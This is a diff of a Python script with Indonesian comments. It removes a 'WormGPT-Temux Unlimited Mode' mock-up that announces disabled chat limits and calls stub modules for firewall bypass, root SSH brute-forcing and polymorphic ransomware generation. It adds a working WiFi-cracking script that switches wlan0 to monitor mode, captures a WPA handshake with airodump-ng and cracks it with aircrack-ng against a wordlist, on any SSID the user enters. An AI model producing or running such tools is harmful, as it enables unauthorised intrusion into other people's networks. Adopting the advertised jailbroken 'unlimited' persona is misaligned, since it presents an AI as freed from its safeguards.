@@ -1,30 +1,22 @@
-import sys
+#!/usr/bin/env python3
 import os
-import core.hacker_engine as he
-import core.malware_gen as mg
-import core.bypass as bypass
+import subprocess
 
-def main():
-    print("[+] WormGPT-Temux Unlimited Mode: AKTIF")
-    print("[+] Batasan Chat: DINONAKTIFKAN")
-    print("[+] Mode: Dark Hacking")
+def start_wifi_hack(ssid, dictionary_file):
+    # Pastikan modul wlan0 tersedia dan akses point mode
+    os.system("sudo ifconfig wlan0 down")
+    os.system("sudo iwconfig wlan0 mode monitor")
+    os.system("sudo ifconfig wlan0 up")
     
-    target = input("\n[Masukkan IP Target]: ")
-    if not target:
-        target = "127.0.0.1" # Default loopback untuk testing
+    # Tangkap handshake
+    print(f"Mencari handshake untuk {ssid}...")
+    subprocess.call(["sudo", "airodump-ng", "-c", "1", "--bssid", ssid, "-w", "capture", "wlan0"])
     
-    print(f"\n[*] Menjalankan bypass firewall pada {target}...")
-    bypass.silent_bypass(target)
-    
-    print("[*] Memulai Brute-Force SSH...")
-    he.brute_force_ssh(target, user="root", pass_list="rockyou.txt")
-    
-    print("[*] Menggenerate Payload Polymorphic Ransomware...")
-    mg.generate_ransomware(payload_type="worm", encryption="AES-256", target=target)
-    
-    print("\n[+] SERANGAN BERHASIL. AKSES PENUH DITERIMA.")
-    print("[+] Menunggu perintah selanjutnya...")
+    # Pecahkan dengan dictionary
+    print("Memulai cracking...")
+    subprocess.call(["aircrack-ng", "-w", dictionary_file, "capture-01.cap"])
 
 if __name__ == "__main__":
-    main()
-
+    target_ssid = input("Masukkan SSID WiFi: ")
+    dict_path = input("Masukkan lokasi file dictionary (contoh: /sdcard/wordlist.txt): ")
+    start_wifi_hack(target_ssid, dict_path)
